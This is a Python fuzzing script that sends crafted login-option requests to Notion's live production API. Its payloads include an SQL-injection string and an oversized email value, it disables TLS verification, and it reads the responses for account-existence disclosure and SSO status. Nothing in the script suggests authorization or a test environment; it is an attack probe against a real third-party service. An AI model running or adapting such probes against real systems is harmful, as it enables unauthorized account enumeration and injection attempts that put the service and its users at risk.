import httpx
import json
import asyncio
from aura.ui.formatter import console

async def fuzz_notion_login_options():
    url = "https://www.notion.so/api/v3/getLoginOptions"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://www.notion.so",
        "Referer": "https://www.notion.so/login"
    }

    # Test payloads: 
    # 1. Standard email
    # 2. Non-existent email
    # 3. Malformed email
    # 4. Injected characters (SQLi/NoSQLi style)
    # 5. Large payload
    test_emails = [
        "admin@notion.so",
        "test_aura_xxxx@gmail.com",
        "invalid-email-format",
        "' OR 1=1 --",
        "A" * 1000 + "@example.com"
    ]

    console.print("[bold cyan]💀 AURA FUZZER: NOTION LOGIN OPTIONS[/bold cyan]")

    async with httpx.AsyncClient(verify=False) as client:
        for email in test_emails:
            payload = {"email": email}
            try:
                console.print(f"[*] Testing: {email[:30]}...")
                resp = await client.post(url, headers=headers, json=payload, timeout=10)
                
                # Check for interesting responses
                # We are looking for variations in status codes or response bodies
                # that might indicate data validation bypass or account existence disclosure.
                status = resp.status_code
                try:
                    data = resp.json()
                    keys = list(data.keys())
                except:
                    data = resp.text[:50]
                    keys = "N/A"

                if status == 200:
                    console.print(f"  [green][+] 200 OK | Body Keys: {keys}[/green]")
                    if "isSso" in str(data):
                        console.print(f"    [yellow][!] SSO detection confirmed: {data.get('isSso')}[/yellow]")
                elif status == 400:
                    console.print(f"  [yellow][!] 400 Bad Request (Validation active)[/yellow]")
                else:
                    console.print(f"  [red][!] {status} Error[/red]")
                    
            except Exception as e:
                console.print(f"  [red][!] Error: {e}[/red]")

if __name__ == "__main__":
    asyncio.run(fuzz_notion_login_options())
